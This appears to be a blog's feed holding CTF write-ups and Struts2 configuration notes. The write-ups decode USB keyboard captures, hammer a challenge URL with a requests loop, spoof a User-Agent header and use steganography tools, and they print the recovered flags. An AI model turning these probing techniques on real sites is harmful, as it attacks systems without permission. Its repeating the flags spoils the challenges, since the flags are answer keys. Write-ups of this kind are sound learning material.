class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ctfshow渔人杯"><a href="#ctfshow渔人杯" class="headerlink" title="ctfshow渔人杯"></a>ctfshow渔人杯</h1><h2 id="签到抽奖"><a href="#签到抽奖" class="headerlink" title="签到抽奖"></a>签到抽奖</h2><p><img src="https://img-blog.csdnimg.cn/20210404122728247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">中文也可能是英文及其他小众语言字符<br></code></pre></td></tr></table></figure><h2 id="感受下气氛"><a href="#感受下气氛" class="headerlink" title="感受下气氛"></a>感受下气氛</h2><p>flag是ctfshow{[0-9]{9}}</p><p>正则匹配，符合条件的都可以，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;123456789&#125;<br></code></pre></td></tr></table></figure><h2 id="神仙姐姐"><a href="#神仙姐姐" class="headerlink" title="神仙姐姐"></a>神仙姐姐</h2><p><img src="https://img-blog.csdnimg.cn/20210404123026959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击拜，抓包<br><img src="https://img-blog.csdnimg.cn/20210404123102170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传参num进行爆破，根据提示num在1-1000内<br><img src="https://img-blog.csdnimg.cn/20210404125742649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>都是假flag，一直往下翻<br><img src="https://img-blog.csdnimg.cn/20210404124738984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>编写脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://f0c222a9-04f2-431b-ae2b-56e871f6b61b.challenge.ctf.show:8080/sx.php&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=gmnu9pfgh503imv66a9tk37ke2&quot;</span><br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    response=requests.get(url, headers=headers);<br>    print(responsea.text)<br></code></pre></td></tr></table></figure><p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404131900210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="阿拉丁"><a href="#阿拉丁" class="headerlink" title="阿拉丁"></a>阿拉丁</h2><p>想要啥就有啥</p><p>好家伙，怎么不给flag，不是说想要啥就有啥吗？<br><img src="https://img-blog.csdnimg.cn/20210404132911508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续问，还是没有<br><img src="https://img-blog.csdnimg.cn/20210404133231967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>burp抓包也看不出什么，看了其他师傅的wp，可以直接问flag每一位是什么？，我直接好家伙，这也行。<br><img src="https://img-blog.csdnimg.cn/20210404133052347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总共45位<br><img src="https://img-blog.csdnimg.cn/20210404134253711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>拼接起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;a15b2830-dcf4-4344-99e5-350a561cbf89&#125;<br></code></pre></td></tr></table></figure><h2 id="迷"><a href="#迷" class="headerlink" title="迷"></a>迷</h2><p><img src="https://img-blog.csdnimg.cn/20210404135014838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问靶机地址<br><img src="https://img-blog.csdnimg.cn/20210404135001556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有一个登录框，还以为是sql注入，看了群里说直接访问/flag<br><img src="https://img-blog.csdnimg.cn/20210404135103522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>是菜蒙蔽了我的双眼，做个题还被嘲讽了<br><img src="https://img-blog.csdnimg.cn/20210404135150921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="飘啊飘"><a href="#飘啊飘" class="headerlink" title="飘啊飘"></a>飘啊飘</h2><p>题目描述：有手X就行</p><p>抓包，伪装请求头<code>User-Agent: Android</code>，状态码302重定向，发现了mb.html<br><img src="https://img-blog.csdnimg.cn/20210405171746862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接访问mb.html<br><img src="https://img-blog.csdnimg.cn/20210405172008540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="简单二维码"><a href="#简单二维码" class="headerlink" title="简单二维码"></a>简单二维码</h2><p>下载附件，一个png图片和一个“wp”，两个假flag。<br><img src="https://img-blog.csdnimg.cn/2021040414094950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用stegsolve进行异或，发现一张二维码<br><img src="https://img-blog.csdnimg.cn/20210404141133808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码，还是假flag<br><img src="https://img-blog.csdnimg.cn/20210404141301883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续异或，还是迷惑信息<br><img src="https://img-blog.csdnimg.cn/20210404141503298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>勾选最低通道，依旧是假flag<br><img src="https://img-blog.csdnimg.cn/20210404142416970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击Analyse，选择Steregram Sover进行左右偏移<br><img src="https://img-blog.csdnimg.cn/2021040414211853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>终于找到了真flag，颈椎治疗，哈哈哈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;Jing_Zhui_Zhi_Liao&#125;<br></code></pre></td></tr></table></figure><h2 id="我跟你拼了"><a href="#我跟你拼了" class="headerlink" title="我跟你拼了"></a>我跟你拼了</h2><p>狸题，下载附件ttt.png和mask.png<img src="https://img-blog.csdnimg.cn/20210404142546734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我傻乎乎的在那拼图，看了wp原来直接修改图片高度就行了，666，果然狸题就是离谱<br><img src="https://img-blog.csdnimg.cn/20210404143008250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考文章：<br><a href="https://l1near.top/index.php/2021/04/03/100.html">首届“红明谷”杯技能场景赛MISC_WP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：记录最近几场比赛的赛后复现&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>Struts2核心配置</title>
    <link href="http://atkx.top/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://atkx.top/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</id>
    <published>2021-03-28T11:24:14.000Z</published>
    <updated>2021-08-15T03:59:06.579Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（二）</p> <a id="more"></a><h1 id="Struts2的核心配置"><a href="#Struts2的核心配置" class="headerlink" title="Struts2的核心配置"></a>Struts2的核心配置</h1><h2 id="Struts2常量配置"><a href="#Struts2常量配置" class="headerlink" title="Struts2常量配置"></a>Struts2常量配置</h2><h3 id="常量配置"><a href="#常量配置" class="headerlink" title="常量配置"></a>常量配置</h3><p><strong>1.在default.properties 中配置</strong></p><p>默认值,不会在该配置文件中配置</p><p><strong>2.在struts.properties中配置</strong></p><p>基本不会在该配置文件中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml">###设置默认编码集为UTF-8,作用于HttpServletRequest的setCharacterEncoding方法<br>struts.i18n.encoding=UTF-8 <br><br>###设置action请求的扩展名为action或者没有扩展名，该属性指定需要Struts 2处理的请求后缀，该属性的默认值是action，即所有匹配*.action的请求都由Struts2处理。如果用户需要指定多个请求后缀，则多个后缀之间以英文逗号（,）隔开<br>struts.action.extension=action,, <br><br>###设置浏览器是否缓存静态内容,默认值为true(生产环境下使用),开发阶段最好关闭<br>struts.serve.static.browserCache=true <br><br>### 当struts的配置文件修改后,系统是否自动重新加载该文件,默认值为false(生产环境下使用) <br>struts.configuration.xml.reload=false <br><br> <br>###设置不使用开发者模式，开发模式下使用,这样可以打印出更详细的错误信息<br>struts.devMode = false <br><br>###设置不开启动态方法调用<br>struts.enable.DynamicMethodInvocation=false<br></code></pre></td></tr></table></figure><p><strong>3.在struts.xml中配置</strong></p><blockquote><p>开发中基本上都在该配置文件中配置常量</p></blockquote><p>通过<code>&lt;constant&gt;</code>元素来配置常量，该标签写<code>&lt;struts&gt;</code>下面，和<code>&lt;package&gt;</code>标签同级</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 声明常量 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 声明常量 --&gt;</span><br><span class="hljs-comment">&lt;!--设置默认编码集UTF-8,解决post请求乱码--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.i18n.encoding&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-comment">&lt;!--设置使用开发者模式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devModel&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 设置后缀 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;action,,&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4.在web.xml中配置</p><p>配置核心过滤器StrutsPrepareAndExecuteFilter时，通过初始化参数来配置常量,通过<code>&lt;filter&gt;</code>元素的<code>&lt;init-param&gt;</code>子元素指定常量</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-comment">&lt;!--指定struts2的核心过滤器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-comment">&lt;!--通过init-param元素配置struts2常量，设置开发者模式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>struts.devModel<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure><p>基本不会在该配置文件中配置</p><p>`</p><h3 id="配置文件加载顺序"><a href="#配置文件加载顺序" class="headerlink" title="配置文件加载顺序"></a>配置文件加载顺序</h3><p>1、default.properties：在该文件保存在struts2-core-2.3.37.jar中org/apache/struts2包下。</p><p>2、struts-default.xml：在核心的jar包struts2-core-2.3.37.jar的最下方，struts2框架的核心功能都是在该配置文件中配置的。</p><p>3、struts-plugin.xml配置文件。</p><p>4、struts.xml：在src的目录下，该文件是Web应用自己的配置的配置文件</p><p>5、struts.properties：该文件是Web应用默认的Struts2的配置文件</p><p>6、web.xml：该文件是Web应用的的配置文件</p><p>后加载的配置文件会覆盖掉之前加载的配置文件</p><h2 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h2><p>在struts2中struts.xml是核心配置文件，struts.xml文件中包含三个标签</p><h3 id="package标签"><a href="#package标签" class="headerlink" title="package标签"></a>package标签</h3><p>与java中的包不同，类似一个代码包，区别不同的action。</p><p>package标签属性：</p><ul><li>name：包的名称，区分不同的package，管理action配置</li><li>namespace：名称空间，一般与标签中的name属性共同决定访问路径</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">namespace=”/” – 根名称空间，不写默认也是“/”。<br>namespace=”/aaa” – 带有名称的名称空间，访问时必须带上才能访问action<br></code></pre></td></tr></table></figure><ul><li> extends：继承，可以继承其他的包，只要继承了，那么该包就包含了其他包的功能，一般都是继承struts-default</li></ul><h3 id="action标签"><a href="#action标签" class="headerlink" title="action标签"></a>action标签</h3><p>action标签主要配置action的访问路径</p><p>action的标签属性：</p><ul><li>name：action的名称，区分不同的action，和package标签中的namespace属性构成了访问路径</li><li>class：配置Action类的全路径全路径=包名+类名，通过反射的原理去执行该类的，默认值是ActionSupport类</li><li>method ： Action类中执行的方法，如果不指定，默认值是execute<h3 id="result标签"><a href="#result标签" class="headerlink" title="result标签"></a>result标签</h3>根据action中的方法返回值，将页面定位到指定的页面或action上</li></ul><p>result标签的属性：</p><ul><li>name属性：和你方法的返回值要一样</li><li>type – 结果类型，有4个值：dispatcher(默认)、redirect、chain、redirectAction</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">dispatcher(默认)和redirect：result标签中“/”代表的是项目根路径，不写就代表当前路径下<br>chain和redirectAction：result标签中“/”没有任何意义，不需要写，写了就是多余，也就是只能从当前路径去指定页面！！！<br>chain：只能转发到同一命名空间下的Action<br>redirect：可以重定向到action中去，也可以重定向到显示页面中去<br></code></pre></td></tr></table></figure><h3 id="struts配置文件分离"><a href="#struts配置文件分离" class="headerlink" title="struts配置文件分离"></a>struts配置文件分离</h3><p>用于按模块开发，在struts.xml配置文件中使用<code>&lt;include file=&quot; &quot;/&gt;</code>包含指定的文件夹</p><p>案例1：有两个配置文件struts-part1.xml和struts-part2.xml，可以在struts.xml中配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-part1.xml&quot;</span>/&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-part2.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>案例2：在cn.itcast.action.demo包下有一个配置文件struts_demo.xml，引入该配置文件到struts.xml中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span 